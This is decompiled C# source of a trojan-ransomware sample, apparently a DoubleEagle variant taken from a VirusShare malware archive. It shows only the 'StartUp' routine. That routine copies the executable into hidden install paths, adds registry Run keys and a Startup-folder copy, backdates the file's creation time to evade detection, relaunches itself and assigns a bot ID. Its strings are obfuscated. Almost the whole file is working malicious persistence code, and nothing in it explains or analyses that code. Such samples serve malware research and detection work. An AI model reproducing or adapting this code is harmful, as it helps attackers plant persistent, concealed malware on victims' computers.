// Decompiled with JetBrains decompiler
// Type: a.StartUp
// Assembly: a, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: F9E5355F-B81F-44C3-B871-657587613D56
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\Trojan-Ransom.Win32.DoubleEagle.oy-d5b498f54e9295f6ea542e3d341d03f3f4f4c5d98da494db89d0d61eb31c41a2.exe

using a.My;
using CmD6QmcsgiPn76lhP6;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace a
{
  [StandardModule]
  internal sealed class StartUp
  {
    [MethodImpl(MethodImplOptions.NoInlining)]
    public static void Start()
    {
      try
      {
        if (Config.Debug)
          return;
        if (Operators.CompareString(Application.ExecutablePath, Config.FilePath, false) == 0 | Operators.CompareString(Application.ExecutablePath, Config.ALTFilePath1, false) == 0 | Operators.CompareString(Application.ExecutablePath, Config.ALTFilePath2, false) == 0)
        {
          if (Operators.CompareString(Application.ExecutablePath, Config.ALTFilePath1, false) == 0)
          {
            Config.FilePath = Config.ALTFilePath1;
            Config.FolderPath = Config.ALTFolderPath1;
            Config.UpdateFile = Config.ALTUpdateFile1;
          }
          if (Operators.CompareString(Application.ExecutablePath, Config.ALTFilePath2, false) == 0)
          {
            Config.FilePath = Config.ALTFilePath2;
            Config.FolderPath = Config.ALTFolderPath2;
            Config.UpdateFile = Config.ALTUpdateFile2;
          }
          try
          {
            MyProject.Computer.Registry.SetValue(Config.RegStartup, Config.RegName, (object) Config.FilePath, RegistryValueKind.String);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          try
          {
            MyProject.Computer.Registry.SetValue(Config.ExtraRegStartup, Config.ExtraRegName, (object) Config.FilePath, RegistryValueKind.String);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          try
          {
            if (MyProject.Computer.FileSystem.FileExists(Application.StartupPath + LSH1IvEDia2sKbWgPr.ySdEOnZ47(4880) + Config.IDRegStartup))
            {
              Config.BotId = Encoding.ASCII.GetString(Convert.FromBase64String(MyProject.Computer.FileSystem.ReadAllText(Application.StartupPath + LSH1IvEDia2sKbWgPr.ySdEOnZ47(4886) + Config.IDRegStartup)));
            }
            else
            {
              string str = Conversion.Int(VBMath.Rnd() * 1000000f).ToString();
              while (str.Length != 6)
                str = Conversion.Int(VBMath.Rnd() * 1000000f).ToString();
              try
              {
                if (DateTime.Compare(DateTime.Parse(Conversions.ToString(File.GetCreationTime(Application.ExecutablePath))), DateTime.Parse(LSH1IvEDia2sKbWgPr.ySdEOnZ47(4892))) == 0)
                  MyProject.Computer.FileSystem.WriteAllText(Application.StartupPath + LSH1IvEDia2sKbWgPr.ySdEOnZ47(4934) + Config.IDRegStartup, Convert.ToBase64String(Encoding.ASCII.GetBytes(LSH1IvEDia2sKbWgPr.ySdEOnZ47(4940) + str.ToString() + LSH1IvEDia2sKbWgPr.ySdEOnZ47(4966) + Config.BotVer.ToString() + LSH1IvEDia2sKbWgPr.ySdEOnZ47(4972) + MyProject.Computer.Info.InstalledUICulture.IetfLanguageTag.ToString() + LSH1IvEDia2sKbWgPr.ySdEOnZ47(4978))), false);
                else
                  MyProject.Computer.FileSystem.WriteAllText(Application.StartupPath + LSH1IvEDia2sKbWgPr.ySdEOnZ47(4984) + Config.IDRegStartup, Convert.ToBase64String(Encoding.ASCII.GetBytes(LSH1IvEDia2sKbWgPr.ySdEOnZ47(4990) + str.ToString() + LSH1IvEDia2sKbWgPr.ySdEOnZ47(5006) + Config.BotVer.ToString() + LSH1IvEDia2sKbWgPr.ySdEOnZ47(5012) + MyProject.Computer.Info.InstalledUICulture.IetfLanguageTag.ToString() + LSH1IvEDia2sKbWgPr.ySdEOnZ47(5018))), false);
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                MyProject.Computer.FileSystem.WriteAllText(Application.StartupPath + LSH1IvEDia2sKbWgPr.ySdEOnZ47(5024) + Config.IDRegStartup, Convert.ToBase64String(Encoding.ASCII.GetBytes(LSH1IvEDia2sKbWgPr.ySdEOnZ47(5030) + str.ToString() + LSH1IvEDia2sKbWgPr.ySdEOnZ47(5046) + Config.BotVer.ToString() + LSH1IvEDia2sKbWgPr.ySdEOnZ47(5052) + MyProject.Computer.Info.InstalledUICulture.IetfLanguageTag.ToString() + LSH1IvEDia2sKbWgPr.ySdEOnZ47(5058))), false);
                ProjectData.ClearProjectError();
              }
              Config.BotId = Encoding.ASCII.GetString(Convert.FromBase64String(MyProject.Computer.FileSystem.ReadAllText(Application.StartupPath + LSH1IvEDia2sKbWgPr.ySdEOnZ47(5064) + Config.IDRegStartup)));
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            string str = Conversion.Int(VBMath.Rnd() * 1000000f).ToString();
            while (str.Length != 6)
              str = Conversion.Int(VBMath.Rnd() * 1000000f).ToString();
            Config.BotId = LSH1IvEDia2sKbWgPr.ySdEOnZ47(5070) + str.ToString() + LSH1IvEDia2sKbWgPr.ySdEOnZ47(5092) + Config.BotVer.ToString() + LSH1IvEDia2sKbWgPr.ySdEOnZ47(5098) + MyProject.Computer.Info.InstalledUICulture.IetfLanguageTag.ToString() + LSH1IvEDia2sKbWgPr.ySdEOnZ47(5104);
            ProjectData.ClearProjectError();
          }
        }
        else
        {
          try
          {
            MyProject.Computer.FileSystem.DeleteFile(Config.FilePath);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          try
          {
            MyProject.Computer.FileSystem.DeleteFile(Config.ALTFilePath1);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          try
          {
            MyProject.Computer.FileSystem.DeleteFile(Config.ALTFilePath2);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          Process[] processes = Process.GetProcesses();
          ListBox listBox = new ListBox();
          int index = 0;
          while (index != checked (processes.Length - 1))
          {
            try
            {
              listBox.Items.Add((object) processes[index].MainModule.FileName.ToLower());
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            checked { ++index; }
          }
          if (listBox.Items.Contains((object) Config.FilePath.ToLower()))
            ProjectData.EndApp();
          if (listBox.Items.Contains((object) Config.ALTFilePath1.ToLower()))
            ProjectData.EndApp();
          if (listBox.Items.Contains((object) Config.ALTFilePath2.ToLower()))
            ProjectData.EndApp();
          try
          {
            byte[] array = MyProject.Computer.FileSystem.ReadAllBytes(Application.ExecutablePath);
            try
            {
              if (!MyProject.Computer.FileSystem.DirectoryExists(Config.FolderPath))
                MyProject.Computer.FileSystem.CreateDirectory(Config.FolderPath);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            FileStream fileStream = new FileStream(Config.FilePath, FileMode.Create);
            fileStream.Write(array, 0, array.Length);
            fileStream.Close();
            if (Config.TryCopToStartFolder)
            {
              try
              {
                MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + LSH1IvEDia2sKbWgPr.ySdEOnZ47(5110) + Config.StartupFolderExeName);
                try
                {
                }
                catch (Exception ex)
                {
                  ProjectData.SetProjectError(ex);
                  ProjectData.ClearProjectError();
                }
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
              }
            }
            try
            {
              MyProject.Computer.Registry.SetValue(Config.RegStartup, Config.RegName, (object) Config.FilePath, RegistryValueKind.String);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            try
            {
              File.SetCreationTime(Config.FilePath, DateTime.Now.AddYears(-3));
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            Thread.Sleep(5000);
            Interaction.Shell(Config.FilePath);
            ProjectData.EndApp();
          }
          catch (Exception ex1)
          {
            ProjectData.SetProjectError(ex1);
            Config.FilePath = Config.ALTFilePath1;
            Config.FolderPath = Config.ALTFolderPath1;
            Config.UpdateFile = Config.ALTUpdateFile1;
            try
            {
              byte[] array = MyProject.Computer.FileSystem.ReadAllBytes(Application.ExecutablePath);
              try
              {
                if (!MyProject.Computer.FileSystem.DirectoryExists(Config.FolderPath))
                  MyProject.Computer.FileSystem.CreateDirectory(Config.FolderPath);
              }
              catch (Exception ex2)
              {
                ProjectData.SetProjectError(ex2);
                ProjectData.ClearProjectError();
              }
              FileStream fileStream = new FileStream(Config.FilePath, FileMode.Create);
              fileStream.Write(array, 0, array.Length);
              fileStream.Close();
              if (Config.TryCopToStartFolder)
              {
                try
                {
                  MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + LSH1IvEDia2sKbWgPr.ySdEOnZ47(5116) + Config.StartupFolderExeName);
                  try
                  {
                  }
                  catch (Exception ex3)
                  {
                    ProjectData.SetProjectError(ex3);
                    ProjectData.ClearProjectError();
                  }
                }
                catch (Exception ex4)
                {
                  ProjectData.SetProjectError(ex4);
                  ProjectData.ClearProjectError();
                }
              }
              try
              {
                MyProject.Computer.Registry.SetValue(Config.RegStartup, Config.RegName, (object) Config.FilePath, RegistryValueKind.String);
              }
              catch (Exception ex5)
              {
                ProjectData.SetProjectError(ex5);
                ProjectData.ClearProjectError();
              }
              try
              {
                File.SetCreationTime(Config.FilePath, DateTime.Now.AddYears(-3));
              }
              catch (Exception ex6)
              {
                ProjectData.SetProjectError(ex6);
                ProjectData.ClearProjectError();
              }
              Thread.Sleep(5000);
              Interaction.Shell(Config.FilePath);
              ProjectData.EndApp();
            }
            catch (Exception ex7)
            {
              ProjectData.SetProjectError(ex7);
              Config.FilePath = Config.ALTFilePath2;
              Config.FolderPath = Config.ALTFolderPath2;
              Config.UpdateFile = Config.ALTUpdateFile2;
              try
              {
                byte[] array = MyProject.Computer.FileSystem.ReadAllBytes(Application.ExecutablePath);
                try
                {
                  if (!MyProject.Computer.FileSystem.DirectoryExists(Config.FolderPath))
                    MyProject.Computer.FileSystem.CreateDirectory(Config.FolderPath);
                }
                catch (Exception ex8)
                {
                  ProjectData.SetProjectError(ex8);
                  ProjectData.ClearProjectError();
                }
                FileStream fileStream = new FileStream(Config.FilePath, FileMode.Create);
                fileStream.Write(array, 0, array.Length);
                fileStream.Close();
                if (Config.TryCopToStartFolder)
                {
                  try
                  {
                    MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + LSH1IvEDia2sKbWgPr.ySdEOnZ47(5122) + Config.StartupFolderExeName);
                    try
                    {
                    }
                    catch (Exception ex9)
                    {
                      ProjectData.SetProjectError(ex9);
                      ProjectData.ClearProjectError();
                    }
                  }
                  catch (Exception ex10)
                  {
                    ProjectData.SetProjectError(ex10);
                    ProjectData.ClearProjectError();
                  }
                }
                try
                {
                  MyProject.Computer.Registry.SetValue(Config.RegStartup, Config.RegName, (object) Config.FilePath, RegistryValueKind.String);
                }
                catch (Exception ex11)
                {
                  ProjectData.SetProjectError(ex11);
                  ProjectData.ClearProjectError();
                }
                try
                {
                  File.SetCreationTime(Config.FilePath, DateTime.Now.AddYears(-3));
                }
                catch (Exception ex12)
                {
                  ProjectData.SetProjectError(ex12);
                  ProjectData.ClearProjectError();
                }
                Thread.Sleep(5000);
                Interaction.Shell(Config.FilePath);
                ProjectData.EndApp();
              }
              catch (Exception ex13)
              {
                ProjectData.SetProjectError(ex13);
                ProjectData.EndApp();
                ProjectData.ClearProjectError();
              }
              ProjectData.ClearProjectError();
            }
            ProjectData.ClearProjectError();
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        string str = Conversion.Int(VBMath.Rnd() * 1000000f).ToString();
        while (str.Length != 6)
          str = Conversion.Int(VBMath.Rnd() * 1000000f).ToString();
        Config.BotId = LSH1IvEDia2sKbWgPr.ySdEOnZ47(5128) + str.ToString() + LSH1IvEDia2sKbWgPr.ySdEOnZ47(5156) + Config.BotVer.ToString() + LSH1IvEDia2sKbWgPr.ySdEOnZ47(5162) + MyProject.Computer.Info.InstalledUICulture.IetfLanguageTag.ToString() + LSH1IvEDia2sKbWgPr.ySdEOnZ47(5168);
        ProjectData.ClearProjectError();
      }
    }
  }
}
